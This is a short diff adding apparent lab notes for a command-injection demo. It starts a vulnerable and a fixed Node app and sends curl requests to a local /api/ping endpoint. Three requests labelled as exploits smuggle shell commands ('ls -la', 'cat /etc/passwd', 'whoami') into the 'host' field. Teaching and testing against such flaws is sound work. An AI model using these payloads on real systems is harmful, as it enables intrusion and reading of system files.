@@ -1,0 +1,19 @@
+cd vul-app
+npm install
+npm start
+
+cd fixed-app
+npm install
+npm start
+
+#NORMAL COMMAND
+curl -X POST http://localhost:3000/api/ping -H "Content-Type: application/json" -d '{"host":"127.0.0.1"}'
+
+#EXPLOIT-1
+curl -X POST http://localhost:3000/api/ping -H "Content-Type: application/json" -d '{"host":"127.0.0.1; ls -la"}'
+
+#EXPLOT-2
+curl -X POST http://localhost:3000/api/ping -H "Content-Type: application/json" -d '{"host":"127.0.0.1; cat /etc/passwd"}'
+
+#EXPLOT-3
+curl -X POST http://localhost:3000/api/ping -H "Content-Type: application/json" -d '{"host":"127.0.0.1 | whoami"}'
